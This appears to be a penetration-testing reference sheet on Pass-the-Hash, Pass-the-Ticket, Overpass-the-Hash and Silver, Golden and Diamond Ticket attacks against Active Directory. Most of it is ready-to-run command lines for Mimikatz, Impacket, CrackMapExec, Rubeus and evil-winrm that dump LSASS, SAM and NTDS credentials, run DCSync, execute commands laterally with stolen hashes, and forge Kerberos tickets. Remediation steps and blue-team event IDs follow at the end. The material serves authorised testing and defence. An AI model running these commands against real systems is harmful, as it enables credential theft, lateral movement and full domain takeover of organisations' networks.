# Pass-the-Hash and Pass-the-Ticket

## Overview
Pass-the-Hash (PtH) and Pass-the-Ticket (PtT) are lateral movement techniques that use stolen authentication material -- NTLM hashes or Kerberos tickets -- instead of plaintext passwords to authenticate to remote systems. Related techniques include Overpass-the-Hash (using an NTLM hash to request a Kerberos ticket), Silver Tickets (forged service tickets), and Golden Tickets (forged TGTs using the KRBTGT hash). These attacks are central to Active Directory compromise and often enable domain-wide takeover.

## Classification
- **CWE:** CWE-522 (Insufficiently Protected Credentials), CWE-294 (Authentication Bypass by Capture-replay)
- **OWASP:** A07:2021 - Identification and Authentication Failures
- **CVSS Base:** 8.1 - 9.8 (High to Critical)
- **MITRE ATT&CK:** T1550.002 (Pass the Hash), T1550.003 (Pass the Ticket), T1558.001 (Golden Ticket), T1558.002 (Silver Ticket)

## Detection Methodology

### 1. Credential Extraction

**Mimikatz -- Credential Dumping:**
```powershell
# Dump credentials from LSASS memory
mimikatz # privilege::debug
mimikatz # sekurlsa::logonpasswords

# Dump NTLM hashes only
mimikatz # sekurlsa::msv

# Dump Kerberos tickets from memory
mimikatz # sekurlsa::tickets /export

# Dump cached credentials
mimikatz # lsadump::cache

# Dump SAM database (local accounts)
mimikatz # lsadump::sam

# DCSync - extract hashes from domain controller remotely
mimikatz # lsadump::dcsync /domain:target.com /user:Administrator
mimikatz # lsadump::dcsync /domain:target.com /all /csv
```

**Impacket -- Remote Credential Extraction:**
```bash
# Dump SAM remotely
secretsdump.py target.com/admin:password@10.10.10.1

# DCSync
secretsdump.py target.com/admin:password@dc.target.com -just-dc

# Dump NTDS.dit hashes only
secretsdump.py target.com/admin:password@dc.target.com -just-dc-ntlm

# Using pass-the-hash to dump
secretsdump.py -hashes :ntlm_hash target.com/admin@10.10.10.1
```

**CrackMapExec -- Mass Credential Dumping:**
```bash
# Dump SAM from multiple hosts
crackmapexec smb targets.txt -u admin -p password --sam

# Dump LSA secrets
crackmapexec smb targets.txt -u admin -p password --lsa

# Dump NTDS.dit from domain controller
crackmapexec smb dc.target.com -u admin -p password --ntds
```

### 2. Pass-the-Hash (NTLM)

**Mimikatz:**
```powershell
# Spawn process with NTLM hash
mimikatz # sekurlsa::pth /user:administrator /domain:target.com /ntlm:<hash> /run:cmd.exe

# PtH to specific target
mimikatz # sekurlsa::pth /user:admin /domain:target.com /ntlm:<hash> /run:"psexec.exe \\target cmd.exe"
```

**Impacket Suite:**
```bash
# PsExec with hash
psexec.py -hashes :<ntlm_hash> target.com/administrator@10.10.10.1

# WMIExec with hash (stealthier, no service creation)
wmiexec.py -hashes :<ntlm_hash> target.com/administrator@10.10.10.1

# SMBExec with hash
smbexec.py -hashes :<ntlm_hash> target.com/administrator@10.10.10.1

# ATExec with hash (uses Task Scheduler)
atexec.py -hashes :<ntlm_hash> target.com/administrator@10.10.10.1 "whoami"

# DComExec with hash
dcomexec.py -hashes :<ntlm_hash> target.com/administrator@10.10.10.1
```

**CrackMapExec:**
```bash
# Execute commands via PtH
crackmapexec smb 10.10.10.0/24 -u administrator -H <ntlm_hash> -x "whoami"

# Check admin access across subnet
crackmapexec smb 10.10.10.0/24 -u administrator -H <ntlm_hash>

# Execute PowerShell via PtH
crackmapexec smb 10.10.10.1 -u admin -H <ntlm_hash> -X "Get-Process"

# WinRM PtH
crackmapexec winrm 10.10.10.1 -u admin -H <ntlm_hash> -x "whoami"
```

**Evil-WinRM:**
```bash
# PtH via WinRM
evil-winrm -i 10.10.10.1 -u administrator -H <ntlm_hash>
```

**xfreerdp (RDP with Hash):**
```bash
# PtH via RDP (requires Restricted Admin Mode enabled on target)
xfreerdp /v:10.10.10.1 /u:administrator /pth:<ntlm_hash> /d:target.com
```

### 3. Overpass-the-Hash
Use an NTLM hash to request a legitimate Kerberos TGT:

**Mimikatz:**
```powershell
# Overpass-the-hash: inject NTLM hash, get Kerberos TGT
mimikatz # sekurlsa::pth /user:administrator /domain:target.com /ntlm:<hash> /run:powershell.exe

# In the new PowerShell, access a network resource to trigger TGT request
# Then use klist to verify Kerberos ticket was obtained
klist
```

**Rubeus:**
```powershell
# Request TGT using NTLM hash
Rubeus.exe asktgt /user:administrator /domain:target.com /rc4:<ntlm_hash> /ptt

# Request TGT using AES256 key (stealthier)
Rubeus.exe asktgt /user:administrator /domain:target.com /aes256:<aes_key> /ptt
```

**Impacket:**
```bash
# Get TGT with hash
getTGT.py target.com/administrator -hashes :<ntlm_hash>

# Use the TGT
export KRB5CCNAME=administrator.ccache
psexec.py -k -no-pass target.com/administrator@dc.target.com
```

### 4. Pass-the-Ticket (Kerberos)

**Mimikatz:**
```powershell
# Export tickets from memory
mimikatz # sekurlsa::tickets /export

# Import ticket into current session
mimikatz # kerberos::ptt ticket.kirbi

# List cached tickets
mimikatz # kerberos::list

# Purge all tickets
mimikatz # kerberos::purge
```

**Rubeus:**
```powershell
# Dump all tickets
Rubeus.exe dump

# Import ticket
Rubeus.exe ptt /ticket:<base64_ticket>

# Import from file
Rubeus.exe ptt /ticket:ticket.kirbi

# Request and pass TGT
Rubeus.exe asktgt /user:admin /domain:target.com /rc4:<hash> /ptt
```

**Linux:**
```bash
# Convert kirbi to ccache format
ticketConverter.py ticket.kirbi ticket.ccache

# Set Kerberos credential cache
export KRB5CCNAME=ticket.ccache

# Use ticket with Impacket tools
psexec.py -k -no-pass target.com/admin@server.target.com
wmiexec.py -k -no-pass target.com/admin@server.target.com
```

### 5. Silver Ticket (Forged Service Ticket)
Forge a TGS ticket using the target service account's NTLM hash:

**Mimikatz:**
```powershell
# Create Silver Ticket (CIFS service for file share access)
mimikatz # kerberos::golden /user:fakeadmin /domain:target.com /sid:S-1-5-21-... \
  /target:server.target.com /service:cifs /rc4:<service_acct_ntlm_hash> /ptt

# Silver Ticket for LDAP (DCSync capability)
mimikatz # kerberos::golden /user:fakeadmin /domain:target.com /sid:S-1-5-21-... \
  /target:dc.target.com /service:ldap /rc4:<dc_hash> /ptt

# Common service types:
# cifs - file share access
# http - web services
# mssql - SQL Server
# ldap - LDAP queries
# host - PsExec, WMI, scheduled tasks
# rpcss - DCOM execution
```

**Impacket:**
```bash
# Create Silver Ticket
ticketer.py -nthash <service_hash> -domain-sid S-1-5-21-... \
  -domain target.com -spn cifs/server.target.com fakeadmin

export KRB5CCNAME=fakeadmin.ccache
smbclient.py -k -no-pass target.com/fakeadmin@server.target.com
```

### 6. Golden Ticket (Forged TGT)
Forge a TGT using the KRBTGT account hash (requires domain compromise):

**Mimikatz:**
```powershell
# Extract KRBTGT hash (requires DCSync or NTDS.dit access)
mimikatz # lsadump::dcsync /domain:target.com /user:krbtgt

# Create Golden Ticket
mimikatz # kerberos::golden /user:fakeadmin /domain:target.com \
  /sid:S-1-5-21-... /krbtgt:<krbtgt_ntlm_hash> /ptt

# Golden Ticket with specific group memberships
mimikatz # kerberos::golden /user:fakeadmin /domain:target.com \
  /sid:S-1-5-21-... /krbtgt:<krbtgt_hash> /groups:512,513,518,519,520 /ptt

# Golden Ticket valid for 10 years (default)
# Can impersonate any user, including non-existent users
```

**Impacket:**
```bash
# Create Golden Ticket
ticketer.py -nthash <krbtgt_hash> -domain-sid S-1-5-21-... \
  -domain target.com fakeadmin

# Use Golden Ticket
export KRB5CCNAME=fakeadmin.ccache
secretsdump.py -k -no-pass target.com/fakeadmin@dc.target.com
psexec.py -k -no-pass target.com/fakeadmin@dc.target.com
```

### 7. Diamond Ticket (Stealthier Golden Ticket)
Modify a legitimate TGT rather than forging from scratch:
```powershell
# Rubeus diamond ticket (modifies a real TGT's PAC)
Rubeus.exe diamond /krbkey:<krbtgt_aes256_key> /user:admin /password:pass \
  /enctype:aes /ticketuser:fakeadmin /ticketuserid:500 /groups:512 /ptt
```

## Remediation
1. **Enable Credential Guard** (Windows 10/Server 2016+) -- protects LSASS with virtualization
2. **Restrict local admin accounts** -- no shared local admin passwords (use LAPS)
3. **Implement Protected Users group** -- prevents NTLM authentication, forces Kerberos
4. **Disable WDigest** -- prevent plaintext credential caching in memory
5. **Rotate KRBTGT password** -- twice in succession to invalidate all Golden Tickets
6. **Use tiered administration** -- separate admin accounts for workstations, servers, and DCs
7. **Enable LSA Protection** -- RunAsPPL to protect LSASS process
8. **Monitor for anomalous authentication** -- Event IDs 4624 (Type 3,9,10), 4648, 4672
9. **Restrict delegation** -- minimize unconstrained delegation, prefer resource-based constrained delegation
10. **Disable NTLM where possible** -- enforce Kerberos-only authentication
11. **Deploy Privileged Access Workstations (PAWs)** for administrative tasks

## Detection (Blue Team Indicators)
```
Pass-the-Hash:
- Event ID 4624: Logon Type 3 (network) with NTLM authentication
- Event ID 4776: credential validation (NTLM)
- Anomaly: admin account authenticating from workstation, not PAW

Pass-the-Ticket:
- Event ID 4768/4769: TGT/TGS requests from unusual sources
- Tickets with anomalous lifetimes or encryption types

Golden Ticket:
- Event ID 4769: TGS request with no prior 4768 (TGT request)
- Tickets with abnormally long lifetimes (10 years default)
- TGT for non-existent user account
- Domain field mismatch in ticket

Silver Ticket:
- Event ID 4624 without corresponding 4768 TGT request
- Service access without normal Kerberos AS exchange
```

## Evidence Collection
When documenting PtH/PtT findings:
- Credential extraction method and source (LSASS, SAM, NTDS.dit, DCSync)
- Number and privilege level of hashes/tickets obtained
- Lateral movement path demonstrated (source → target chain)
- Systems accessed using PtH/PtT and access level achieved
- Golden/Silver ticket parameters used (domain SID, KRBTGT hash)
- Credential Guard and LSA Protection status across environment
- NTLM vs Kerberos authentication enforcement status
- LAPS deployment coverage
- Detection gaps (events logged but not alerted, or not logged at all)
- Remediation roadmap with prioritized defensive improvements
